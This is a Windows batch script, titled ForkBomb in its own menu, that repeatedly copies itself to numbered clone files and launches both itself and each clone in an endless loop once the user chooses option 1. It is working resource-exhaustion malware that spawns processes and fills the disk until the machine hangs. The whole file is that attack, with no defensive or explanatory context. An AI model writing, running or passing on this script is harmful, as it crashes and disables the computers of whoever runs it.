@echo off
set name=%0
set clone=1


echo ForkBomb-1-
echo exit-2-
set /p input=
if /I "%input%" EQU "1" goto start
if /I "%input%" EQU "2" goto exit



:start
:clone
If not exist clone%clone%.bat (
copy "%name%" "clone%clone%.bat"
) else (
set /a clone=%clone%+1
GoTo clone
)
start %name%
start clone%clone%.bat
GoTo start

:exit
exit 1


pause
